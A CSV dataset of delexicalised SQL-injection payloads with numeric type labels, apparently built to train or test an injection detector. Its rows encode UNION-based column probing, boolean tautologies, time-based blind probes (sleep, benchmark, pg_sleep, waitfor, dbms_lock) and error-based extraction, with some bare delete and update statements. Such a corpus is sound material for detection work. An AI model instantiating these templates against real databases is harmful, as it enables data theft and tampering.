payload_delex,type_id
"__INT__' ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-9779__STR__hmzj__STR__hmzj,2
"__INT__' ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' where __INT__ = __INT__ union all select null , null#",7
select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,7
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__' ) union all select null , null , null , null#",7
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , then ) values ( __STR__ , __STR__. __IDENT__' )",2
"-__INT__' ) or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
__INT__ or pg_sleep ( __time__ ) --,6
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__ ) ) or __INT__ = __INT__ --,2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ like ""__IDENT__",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
select __IDENT__ from __IDENT__ union all select if from __IDENT__ order by __IDENT__,7
"-__INT__' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__ ) ) ) or __INT__ = __INT__ --,2
"1__STR__xhqy' where __INT__ = __INT__ union all select null , null --",7
"__INT__"" ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__ ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) # __IDENT__",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__",2
"__INT__ % and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and % __STR__",2
and __INT__ = utl_inaddr . __IDENT__ ( __IDENT__' ) --,3
", ( __IDENT__ if ( [__IDENT__] = [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ; ) , ( __IDENT__ if ( [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ; )",6
-__INT__' ) ) order by __INT__#,0
-__INT__ % __STR__ % __STR__,2
"__INT__ % "" ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
end and ( ( ( __STR__ = '__IDENT__,2
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ ) or sleep ( __INT__ ),6
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"1__STR__ybfo' from dual where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null#",7
__INT__ % ' ) ) and __INT__ = __INT__,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ % ) ) ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( % __STR__",6
-__INT__' ) order by __INT__#,0
__INT__' ) and ( __INT__ = __INT__ ) * __INT__,2
"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",6
"__INT__"" ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"__INT__' union select || / __INT__ , __IDENT__ ( ) -- __INT__",7
"-__INT__"" or __INT__ = __INT__",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"__IDENT__ __IDENT__ , __INT__ __INT__-__IDENT__",0
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) --",6
"__INT__ % "" ) ) and __INT__ = __INT__#",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
-2568__STR__exyw__STR__exyw,2
__INT__ % ) ) ) waitfor __IDENT__ __TIME____STR__ % __STR__,6
-__INT__' in __IDENT__ __IDENT__ ) order by __INT__ --,0
__INT__ ) or sleep ( __INT__ ) and ( __IDENT__,6
-__INT__ % ' ) ) order by __INT__ --,0
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"-__INT__"" where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' ) or __INT__ = __INT__,2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"__INT__ % and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and % __STR__",2
__INT__ ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__ % ' union all select null , null#",7
-__INT__' or __INT__ = __INT__,2
"__INT__ % ' ) ) union all select null , null , null#",7
__INT__ ) and __INT__ = __INT__ and ( __INT__ = __INT__,2
-__INT__' ) where __INT__ = __INT__ or __INT__ = __INT__,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ % ' ) union all select null , null , null , null , null , null , null#",7
__INT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
-9509__STR__gsmz__STR__gsmz,2
__INT__ % ' ) and __INT__ = __INT__,2
-2432__STR__ejhp__STR__ejhp,2
"__INT__ union select __IDENT__ , null from information_schema . __IDENT__ where __IDENT__ = __STR__ --",7
"__INT__ , ( case when __INT__ = __INT__ then __INT__ else null end )",0
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__"" where __INT__ = __INT__ order by __INT__#",0
"__INT__ % "" union all select null , null , null , null --",7
__INT__' ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
delete from __IDENT__ ;,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"-__INT__ % "" ) union all select __INT__ , __INT__ , __INT__#",7
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
__INT__' and __INT__ = __INT__#,2
__INT__ % __STR__ % __STR__,2
-__INT__' ) ) ) or __INT__ = __INT__,2
"__INT__"" ) ) ) rlike sleep ( __INT__ ) #",6
"-__INT__"" ) ) ) union all select __INT__ , __INT__ , __INT__ --",7
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__IDENT__' or __INT__ = __INT__ / *,1
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",0
"__INT__ % "" ) ) ) and __INT__ = __INT__ --",2
"-__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__#",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__ --,2
__INT__ and __INT__ = __INT__#,2
-__INT__ ) where __INT__ = __INT__ order by __INT__#,0
"__INT__ % __IDENT__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and % __STR__",6
-8010__STR__eipf__STR__eipf,2
1__STR__bmsa__STR__bmsa,2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"-__INT__' ) or elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __INT__ = __INT__",2
1__STR__qfxg__STR__qfxg,2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ like '__IDENT__",2
"__INT__"" where __INT__ = __INT__ or sleep ( __INT__ ) --",6
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __INT__ = __INT__",2
__INT__' where __INT__ = __INT__ or sleep ( __INT__ ) --,6
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) ) and ( __INT__ = __INT__ ) * __INT__ and ( ( __INT__ = __INT__,2
-__INT__ % __STR__ % __STR__,2
1__STR__hkjf__STR__hkjf,2
1__STR__qsrz__STR__qsrz,2
"-__INT__ % "" ) union all select __INT__#",7
"-__INT__' ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"-__INT__"" ) union all select __INT__ , __INT__ , __INT__#",7
"-__INT__"" ) where __INT__ = __INT__ or __INT__ = __INT__ --",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ like ""__IDENT__",2
1__STR__bely__STR__bely,2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
-__INT__ ) or __INT__ = __INT__ and ( __INT__ = __INT__,2
"__INT__' ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( % __STR__",2
__INT__' ) and __INT__ = __INT__ --,2
"-__INT__"" or __INT__ = __INT__#",2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__ ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ % "" and __INT__ = __INT__ --",2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) # __IDENT__",2
1__STR__rskq__STR__rskq,2
"__INT__ % "" ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__IDENT__ ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) __IDENT__ ( [__IDENT__] , sleep ( [__IDENT__] ) )",6
__INT__ and __INT__ = __INT__# __IDENT__,2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"__INT__' ) where __INT__ = __INT__ union all select null , null , null , null , null --",7
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
__INT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"end and ( ( __STR__ like ""__IDENT__",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ % ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__"" ) ) ) or sleep ( __INT__ ) #",6
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __INT__ = __INT__",2
-8725__STR__vblw__STR__vblw,2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
1__STR__kglx__STR__kglx,2
__INT__ ) ) ) and sleep ( __INT__ ) #,6
"-__INT__ ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"-__INT__"" or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"-__INT__ % "" ) or __INT__ = __INT__ --",2
"-__INT__ % "" order by __INT__#",0
__INT__ ) ) waitfor __IDENT__ __STR__ --,6
"__INT__ % "" ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__INT__ ) ) ) waitfor __IDENT__ __TIME__ --,6
"-__INT__ % or elt ( __INT__ = __INT__ , __INT__ ) and % __STR__",2
"__INT__' ) where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null#",7
__INT__ ) where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
"__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__"" ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
or __IDENT__ like char ( __INT__ ),2
__INT__ ) and __INT__ = __INT__,2
__INT__' and ( __INT__ = __INT__ ) * __INT__,2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"-__INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",2
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__,2
"-__INT__ % "" ) or __INT__ = __INT__",2
or __STR__ > __STR__,2
"-__INT__"" ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
__INT__ and ( __INT__ = __INT__ ) * __INT__# __IDENT__,2
"__INT__"" or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ % ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( % __STR__",6
"__INT__ % "" ) ) rlike sleep ( __INT__ ) #",6
"__INT__ ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
__INT__ % __STR__ % __STR__,2
"__INT__"" ) order by __INT__#",0
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
delete from __IDENT__,2
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
"__INT__"" and __INT__ = __INT__#",2
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
"-__INT__"" ) or __INT__ = __INT__ --",2
__INT__ ) ) ) waitfor __IDENT__ __STR__ and ( ( ( __INT__ = __INT__,6
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",6
__INT__ ) ) and __INT__ = __INT__#,2
__INT__ ) ) waitfor __IDENT__ __TIME__ --,6
__INT__ ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
-3088__STR__miwk__STR__miwk,2
-7378__STR__bnmn__STR__bnmn,2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --,6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = '__IDENT__",2
-1036__STR__wvbi__STR__wvbi,2
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
